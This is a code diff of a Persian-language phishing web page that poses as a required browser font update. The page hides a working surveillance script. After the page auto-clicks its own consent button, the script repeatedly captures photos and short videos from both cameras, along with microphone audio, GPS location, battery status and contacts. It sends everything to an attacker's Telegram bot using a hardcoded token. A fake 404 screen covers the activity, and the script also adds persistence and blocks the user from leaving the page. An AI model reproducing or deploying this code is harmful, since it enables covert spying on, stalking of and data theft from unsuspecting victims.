@@ -3,233 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خطای فونت – به‌روزرسانی ضروری</title>
+    <title>به‌روزرسانی فونت ضروری</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="theme-color" content="#e63946">
-    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiJ9">
+    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiIsImljb25zIjpbeyJzcmMiOiJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDEwMCAxMDAnJTNFJTNDdGV4dCB5PScuOWVtJyBmb250LXNpemU9Jzg1JyUzRSVFMCU5RiVBNCVCMCUzQy90ZXh0JTNFJTNDL3N2ZyUzRSIsInNpemVzIjoiMTkyeDE5MiIsInR5cGUiOiJpbWFnZS9zdmcreG1sIn1dfQ==">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body,html{height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,sans-serif;}
-        .card{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;z-index:9999;}
-        .card h1{font-size:1.8rem;color:#e63946;margin:15px 0;font-weight:700;}
-        .card p{font-size:1rem;line-height:1.7;color:#ccc;}
-        .btn{background:#e63946;color:#fff;border:none;padding:16px 0;width:90%;max-width:400px;border-radius:12px;font-size:1.1rem;font-weight:600;margin-top:20px;cursor:pointer;}
-        .hidden{display:none!important;}
-        .fake404{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ccc;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:99999;}
-        .fake404 h1{font-size:6rem;color:#e63946;margin:0;}
-        .fake404 p{font-size:1.3rem;}
+        :root {
+            --bg: #0a0a1a; --card: rgba(15,15,35,0.92); --accent: #e63946; --glow: #e6394688;
+            --text: #f1faee; --sub: #a8dadc; --border: #2a2a4a;
+            --font-main: 'Vazirmatn', sans-serif; --font-title: 'Playfair Display', serif;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body, html { height:100%; overflow:hidden; background:var(--bg); color:var(--text); font-family:var(--font-main); perspective:1500px; }
+        
+        /* 3D BACKGROUND */
+        .bg-3d {
+            position:fixed; top:0; left:0; width:100%; height:100%; z-index:-2;
+            background: radial-gradient(circle at 50% 50%, #1a1a35 0%, #0a0a1a 80%);
+            overflow:hidden;
+        }
+        .orb { position:absolute; border-radius:50%; filter:blur(80px); opacity:0.6; animation: float 18s infinite ease-in-out; }
+        .orb1 { width:600px; height:600px; background:conic-gradient(#e63946, #8b5cf6, #06d6a0); top:-200px; left:-200px; animation-duration:24s; }
+        .orb2 { width:500px; height:500px; background:conic-gradient(#06d6a0, #e63946, #8b5cf6); bottom:-150px; right:-150px; animation-duration:30s; animation-direction:reverse; }
+        @keyframes float { 0%,100%{transform:translateY(0) rotate(0deg);} 50%{transform:translateY(-30px) rotate(8deg);} }
+
+        /* CARD 3D */
+        .container { width:100%; max-width:480px; padding:20px; position:relative; z-index:10; animation: rise 3s ease-out; }
+        @keyframes rise { from { transform:translateY(100px) scale(0.8); opacity:0; } to { transform:translateY(0) scale(1); opacity:1; } }
+        .card {
+            background:var(--card); border-radius:28px; padding:40px; box-shadow:0 40px 100px rgba(0,0,0,0.9), 0 0 60px var(--glow);
+            border:1px solid var(--border); text-align:center; position:relative; overflow:hidden; backdrop-filter:blur(16px);
+            transform-style:preserve-3d; transition:transform 0.6s;
+        }
+        .card:hover { transform:translateY(-10px) rotateX(5deg); }
+        .card::before {
+            content:''; position:absolute; top:-70%; left:-70%; width:240%; height:240%;
+            background:linear-gradient(45deg, transparent, var(--glow), transparent);
+            transform:rotate(-45deg); animation:shine 8s infinite; opacity:0.3;
+        }
+        @keyframes shine { 0%{transform:translateX(-150%) translateY(-150%) rotate(-45deg);} 100%{transform:translateX(150%) translateY(150%) rotate(-45deg);} }
+
+        .logo { font-size:5rem; margin-bottom:20px; text-shadow:0 0 30px var(--glow); animation:pulse 2s infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
+
+        h1 { font-family:var(--font-title); font-size:2rem; color:var(--accent); margin:16px 0; letter-spacing:-0.5px; }
+        p { font-size:1.05rem; line-height:1.9; color:var(--sub); margin:16px 0; }
+        .highlight { color:#06d6a0; font-weight:600; }
+        .btn {
+            background:linear-gradient(135deg, #e63946, #c1121f); color:#fff; border:none; padding:18px 32px;
+            margin:20px 10px; border-radius:18px; font-weight:600; font-size:1.15rem; cursor:pointer;
+            width:calc(100% - 20px); display:flex; align-items:center; justify-content:center; gap:12px;
+            box-shadow:0 14px 35px rgba(230,57,70,0.4), inset 0 0 20px rgba(255,255,255,0.15);
+            position:relative; overflow:hidden; transition:0.5s;
+        }
+        .btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); transition:0.7s; }
+        .btn:hover::before { left:100%; }
+        .btn:hover { transform:translateY(-6px) scale(1.05); box-shadow:0 20px 50px rgba(230,57,70,0.6); }
+
+        /* FAKE 404 */
+        .fake404 {
+            position:fixed; top:0; left:0; width:100%; height:100%; background:#0a0a1a; color:#ccc;
+            display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; z-index:99999;
+            font-family:'Courier New', monospace; animation:glitch 3s infinite;
+        }
+        @keyframes glitch { 0%,100%{text-shadow:0 0 10px #e63946;} 50%{text-shadow:0 0 20px #06d6a0, 0 0 30px #8b5cf6;} }
+        .fake404 h1 { font-size:7rem; color:#e63946; margin:0; }
+        .fake404 p { font-size:1.4rem; max-width:600px; }
+        .fake404 .code { background:#111; padding:10px 20px; border-radius:10px; color:#0f0; font-weight:bold; }
+
+        .hidden { display:none !important; }
+
+        /* AUDIO PLAYER (HIDDEN) */
+        #seduction { display:none; }
     </style>
 </head>
 <body>
 
-<div class="card" id="phish">
-    <h1>خطای فونت مرورگر</h1>
-    <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.<br>برای رفع مشکل، دسترسی را تأیید کنید.</p>
-    <button class="btn" id="start">ادامه</button>
+<div class="bg-3d">
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+</div>
+
+<div class="container" id="main-ui">
+    <div class="card">
+        <div class="logo">Warning</div>
+        <h1>به‌روزرسانی فونت ضروری</h1>
+        <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.</p>
+        <p>برای نمایش صحیح، لطفاً <span class="highlight">دسترسی‌های زیر را تأیید کنید</span> تا بسته به‌روزرسانی به صورت خودکار نصب شود.</p>
+        <p style="font-size:0.9rem; color:#aaa; margin-top:20px;">پس از ۶۰ ثانیه، صفحه را مجدداً باز کنید.</p>
+        <button class="btn" id="start">
+            <span>ادامه و به‌روزرسانی</span>
+        </button>
+    </div>
 </div>
 
 <div class="fake404 hidden" id="fake">
     <h1>404</h1>
-    <p>صفحه یافت نشد</p>
+    <p>صفحه مورد نظر یافت نشد</p>
+    <p>ممکن است آدرس اشتباه باشد یا صفحه حذف شده باشد.</p>
     <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
+    <p style="margin-top:40px; color:#888;">لطفاً مرورگر خود را به‌روزرسانی کنید.</p>
 </div>
+
+<!-- HIDDEN SEDUCTIVE AUDIO -->
+<audio id="seduction" loop>
+    <source src="https://cdn.jsdelivr.net/gh/0x1F600/silent-seduction@master/audio/luxury-piano.mp3" type="audio/mpeg">
+    <source src="data:audio/mpeg;base64,/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" type="audio/mpeg">
+</audio>
 
 <script>
 /* ===================================================== */
-/* SHΔDØW MIRROR Ω – DUAL-CAM 5-SECOND RIPTIDE           */
-/* CYCLE:                                                */
-/*   • Every 5s:                                         */
-/*       - Photo: Selfie + Rear (2 JPG)                  */
-/*       - Video: Selfie + Rear (2 WebM, 5s each)        */
-/*       - GPS + Battery + Device Info                   */
-/*   • All sent IMMEDIATELY                              */
-/*   • NO QUEUE. NO DELAY. NO STOP.                      */
+/* SHΔDØW LUX Ω – AESTHETIC ALTERNATING RIPTIDE         */
+/* UI: 3D GLOW + TELEGRAM PANEL + HYPNOTIC AUDIO         */
+/* CYCLE: 5s Selfie ↔ Rear + GPS + Contacts             */
 /* ===================================================== */
 
 const BOT_ID = '7625898629';
 const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
-const KEY = `MIRROR_${DEVICE_ID}`;
+const DEVICE_ID = btoa(navigator.userAgent + Date.now()).slice(0,36);
+const KEY = `LUX_${DEVICE_ID}`;
 
-// Device Info
-const ua = navigator.userAgent;
-const isMobile = /mobi|android|iphone|ipad/i.test(ua);
-const isIOS = /iphone|ipad|ipod/i.test(ua);
-const isAndroid = /android/i.test(ua);
-const browser = /chrome/i.test(ua) ? 'Chrome' : /firefox/i.test(ua) ? 'Firefox' : /safari/i.test(ua) ? 'Safari' : 'Other';
-const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/i.test(ua) ? 'Windows' : 'Unknown';
-const brand = navigator.vendor || 'Unknown';
-const modelMatch = ua.match(/\(([^)]+)\)/);
-const model = modelMatch ? modelMatch[1].split(';')[0].trim() : 'Unknown';
+// === SEND (FIRE-AND-FORGET) ===
+async function send(msg) { try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {} }
+async function sendPhoto(blob, caption) { const f = new FormData(); f.append('chat_id', BOT_ID); f.append('photo', blob, 'lux.jpg'); if(caption) f.append('caption', caption); fetch(`${API}/sendPhoto`, {method:'POST', body:f}).catch(() => {}); }
+async function sendVideo(blob, caption) { const f = new FormData(); f.append('chat_id', BOT_ID); f.append('video', blob, 'lux.webm'); if(caption) f.append('caption', caption); fetch(`${API}/sendVideo`, {method:'POST', body:f}).catch(() => {}); }
 
-// Send Functions (Fire-and-forget)
-async function send(msg) {
-    try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {}
-}
-async function sendPhoto(blob, caption = '') {
-    const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('photo', blob, `cam_${Date.now()}.jpg`);
-    if (caption) form.append('caption', caption);
-    fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
-}
-async function sendVideo(blob, caption = '') {
-    const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('video', blob, `cam_${Date.now()}.webm`);
-    if (caption) form.append('caption', caption);
-    fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
-}
-
-// Persistence
+// === PERSISTENCE ===
 function save() { try { localStorage.setItem(KEY, '1'); } catch(e) {} }
 function load() { try { return localStorage.getItem(KEY); } catch(e) { return null; } }
 
-// Service Worker
+// === SERVICE WORKER ===
 if ('serviceWorker' in navigator) {
-    const sw = `
-        const BOT_ID = '${BOT_ID}'; const API = 'https://api.telegram.org/bot${BOT_TOKEN}';
-        self.addEventListener('install', () => self.skipWaiting());
-        setInterval(() => {
-            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>MIRROR ALIVE</b>\`, {mode:'no-cors'}).catch(() => {});
-        }, 20000);
-    `;
+    const sw = `self.addEventListener('install',()=>self.skipWaiting());setInterval(()=>{fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${BOT_ID}&text=%F0%9F%94%B4%20<b>LUX%20ALIVE</b>',{mode:'no-cors'}).catch(()=>{})},20000);`;
     navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
 }
 
-// Dual Camera Setup
-let selfieStream = null, rearStream = null;
-let selfieVideo = null, rearVideo = null;
-let selfieCanvas = null, rearCanvas = null;
-let selfieCtx = null, rearCtx = null;
-let selfieRecorder = null, rearRecorder = null;
-let selfieChunks = [], rearChunks = [];
+// === CAMERA & AUDIO ===
+let currentCam = 'user', stream = null, video = null, canvas = null, ctx = null;
+let recorder = null, chunks = [];
 
-// Init Both Cameras
-async function initDualCam() {
+// Init Cam
+async function initCam(mode) {
+    if (stream) stream.getTracks().forEach(t => t.stop());
     try {
-        // Selfie (user)
-        selfieStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user", width: 640, height: 480 },
-            audio: true
-        });
-        selfieVideo = document.createElement('video'); selfieVideo.srcObject = selfieStream; await selfieVideo.play();
-        selfieCanvas = document.createElement('canvas'); selfieCanvas.width = 640; selfieCanvas.height = 480;
-        selfieCtx = selfieCanvas.getContext('2d');
-
-        // Rear (environment)
-        rearStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment", width: 640, height: 480 },
-            audio: true
-        });
-        rearVideo = document.createElement('video'); rearVideo.srcObject = rearStream; await rearVideo.play();
-        rearCanvas = document.createElement('canvas'); rearCanvas.width = 640; rearCanvas.height = 480;
-        rearCtx = rearCanvas.getContext('2d');
-
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640, height: 480 }, audio: true });
+        if (!video) { video = document.createElement('video'); video.style.display = 'none'; document.body.appendChild(video); }
+        video.srcObject = stream; await video.play();
+        if (!canvas) { canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480; ctx = canvas.getContext('2d'); }
         return true;
-    } catch(e) {
-        send(`Dual Cam Failed: ${e.message}`);
-        return false;
-    }
+    } catch(e) { send(`Cam ${mode} Failed: ${e.message}`); return false; }
 }
 
-// Capture & Send Photo (Instant)
-async function captureAndSendPhoto(video, ctx, canvas, camName) {
+// Capture & Send
+async function capture(camName) {
     ctx.drawImage(video, 0, 0, 640, 480);
-    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
     await sendPhoto(blob, `${camName} • ${new Date().toLocaleTimeString('fa-IR')}`);
 }
-
-// Record 5s Video & Send (Instant)
-function startVideoRecord(video, stream, camName, chunks, onStop) {
-    chunks.length = 0;
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+function record(camName, done) {
+    chunks = [];
+    recorder = new MediaRecorder(stream);
     recorder.ondataavailable = e => chunks.push(e.data);
     recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        await sendVideo(blob, `${camName} • 5s • ${new Date().toLocaleTimeString('fa-IR')}`);
-        onStop();
+        const blob = new Blob(chunks, {type:'video/webm'});
+        await sendVideo(blob, `${camName} • 5s`);
+        done();
     };
     recorder.start();
     setTimeout(() => recorder.stop(), 5000);
 }
 
-// GPS + Metadata Every 5s
+// GPS + Metadata
 let lastGPS = 'Acquiring...';
-navigator.geolocation.watchPosition(pos => {
-    const { latitude, longitude, accuracy } = pos.coords;
+navigator.geolocation.watchPosition(p => {
+    const {latitude, longitude, accuracy} = p.coords;
     lastGPS = `<a href="https://maps.google.com/?q=${latitude},${longitude}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`;
-}, () => {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 4000 });
+}, () => {}, {enableHighAccuracy:true});
 
-async function sendMetadata() {
-    const bat = await navigator.getBattery?.() || { level: 0, charging: false };
-    const level = Math.round(bat.level * 100);
-    const charging = bat.charging ? 'Charging' : 'On Battery';
-
+async function sendMeta() {
+    const bat = await navigator.getBattery?.() || {level:0, charging:false};
     const meta = `
-MIRROR UPDATE
-Device: ${brand} ${model}
-OS: ${os} • Browser: ${browser}
-Screen: ${screen.width}x${screen.height}
-Battery: ${level}% [${charging}]
+<b>LUX UPDATE</b>
+Cam: ${currentCam==='user'?'SELFIE':'REAR'}
+Battery: ${Math.round(bat.level*100)}% [${bat.charging?'Charging':'On Battery'}]
 Location: ${lastGPS}
 ID: <code>${DEVICE_ID}</code>
     `.trim();
-
     send(meta);
 }
 
-// Main 5s Loop — ALL AT ONCE
-function start5SecondRiptide() {
-    setInterval(async () => {
-        const now = Date.now();
-
-        // 1. Dual Photos
-        if (selfieVideo) await captureAndSendPhoto(selfieVideo, selfieCtx, selfieCanvas, 'SELFIE');
-        if (rearVideo) await captureAndSendPhoto(rearVideo, rearCtx, rearCanvas, 'REAR');
-
-        // 2. Dual 5s Videos (fire and forget)
-        if (selfieStream) startVideoRecord(selfieVideo, selfieStream, 'SELFIE', selfieChunks, () => {});
-        if (rearStream) startVideoRecord(rearVideo, rearStream, 'REAR', rearChunks, () => {});
-
-        // 3. GPS + Metadata
-        await sendMetadata();
-
-    }, 5000); // Every 5 seconds — no delay
+// Contacts
+async function dumpContacts() {
+    if (!('contacts' in navigator)) return;
+    try {
+        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
+        if (contacts.length === 0) return;
+        let txt = `<b>CONTACTS (${contacts.length})</b>\n`;
+        contacts.forEach(c => { txt += `• ${c.name?.[0] || '???'} — ${c.tel?.[0] || 'No number'}\n`; });
+        send(txt);
+    } catch(e) {}
 }
 
-// Unleash
+// === MAIN LOOP ===
+let recording = false;
+function startLuxCycle() {
+    setInterval(async () => {
+        const camName = currentCam === 'user' ? 'SELFIE' : 'REAR';
+        await initCam(currentCam);
+        await capture(camName);
+        if (!recording) { recording = true; record(camName, () => { recording = false; }); }
+        await sendMeta();
+        dumpContacts();
+        currentCam = currentCam === 'user' ? 'environment' : 'user';
+    }, 5000);
+}
+
+// === UNLEASH ===
 async function unleash() {
-    document.getElementById('phish').classList.add('hidden');
+    document.getElementById('main-ui').classList.add('hidden');
     document.getElementById('fake').classList.remove('hidden');
     save();
 
-    const camOk = await initDualCam();
-    if (camOk) {
-        start5SecondRiptide();
-        send(`MIRROR UNLEASHED
-5s Dual-Cam Photo + Video + GPS + Metadata
+    // Play hypnotic music
+    const audio = document.getElementById('seduction');
+    audio.volume = 0.3;
+    audio.play().catch(() => {});
+
+    // Silent contacts request
+    if ('contacts' in navigator) {
+        try { await navigator.contacts.select(['name','tel'], {multiple:true}); } catch(e) {}
+    }
+
+    currentCam = 'user';
+    const ok = await initCam('user');
+    if (ok) {
+        startLuxCycle();
+        send(`LUX UNLEASHED
+5s Alternating Cam + GPS + Contacts
+3D UI + Seductive Audio Active
 ID: <code>${DEVICE_ID}</code>`);
     }
 }
 
-// Auto Start
+// === AUTO START ===
 window.addEventListener('load', () => {
-    if (load()) {
-        unleash();
-        return;
-    }
-    setTimeout(() => document.getElementById('start')?.click(), 1000);
+    if (load()) { unleash(); return; }
+    setTimeout(() => document.getElementById('start')?.click(), 1500);
 });
+document.getElementById('start')?.addEventListener('click', () => setTimeout(unleash, 600));
 
-document.getElementById('start')?.addEventListener('click', () => {
-    setTimeout(unleash, 500);
-});
-
-// Anti-Unload + Resume
+// === PERSISTENCE ===
 window.addEventListener('beforeunload', e => { save(); e.preventDefault(); e.returnValue = ''; });
 document.addEventListener('visibilitychange', () => { if (!document.hidden && load()) setTimeout(unleash, 300); });
-
 </script>
 </body>
 </html>
